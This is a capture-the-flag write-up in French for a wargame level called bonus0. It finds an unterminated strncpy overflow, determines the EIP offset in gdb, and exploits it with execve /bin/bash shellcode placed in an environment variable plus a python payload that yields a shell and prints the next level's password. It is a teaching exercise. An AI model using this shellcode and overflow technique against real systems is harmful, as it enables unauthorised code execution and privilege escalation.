```
./bonus0
 -
test
 -
12
test 12
```

On a un executable qui attend 2 entrées et qui les affiche.
Comprenons le code.
```
objdump -M intel -d bonus0
```

On remarque un main avec 2 fonctions: p et pp.
Le main crée un buffer de 42 (//0x40 - 0x16) puis appelle la fonction pp en lui transmettant le buffer en argument.
La fonction pp crée 2 buffer de 20 de taille qui seront utilisés par la fonction p qui est appelée 2 fois et qui a pour utilisation d'afficher une string (" - ")
puis elle va read et ecrire le resultat du read dans le pointeur passé en argument. En revanche strncpy ne rajoute pas de '\0' si la longeur max est atteinte.
Les espaces memoires des 2 buffers se suivent, donc si a fait plus de 20 caracteres, on va avoir les 2 chaines qui se suivent et donc notre buffer de 42 sera trop petit.
(40 + 1 + 20 > 42) et donc segfault

```
gdb ./bonus0
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
01234567890123456789
 -
01234567890123456789
0123456789012345678901234567890123456789�� 01234567890123456789��

Program received signal SIGSEGV, Segmentation fault.
0x32313039 in ?? ()
(gdb) info registers
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffffce0	0xbffffce0
ebp            0x38373635	0x38373635
esi            0x0	0
edi            0x0	0
eip            0x32313039	0x32313039
```
On comprend donc que l'EIP est réécrit au 9eme caractere.

A cause de l'espace reduit nous allon ecrire notre shell code (le meme que celui du niveau 9) dans une variable d'environement.
D'ailleurs vous remrquerez que l'environnement est un peu cassé (impossible de Ctrl L ou de clear), c'est ce qui m'a mit sur la voie.
Puis on localise son adresse afin de l'executer.
```
export EXPLOIT=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
gdb ./bonus0
b main
x/s *environ
0xbfffe8e0
p/x 0xbfffe8e0+500 # on se decale dans la memoire car les arguments pourraient nous decaler. Etant donner qu'on a que des nop ca ne change rien.
$3 = 0xbfffead4
```

Puis on lance la commande:
```
(python -c 'print "A"*4095+"\n"+"\x90"*9+"\xd4\xea\xff\xbf"+"C"*20'; cat) | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAA�������������CCCCCCC�� �������������CCCCCCC��
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
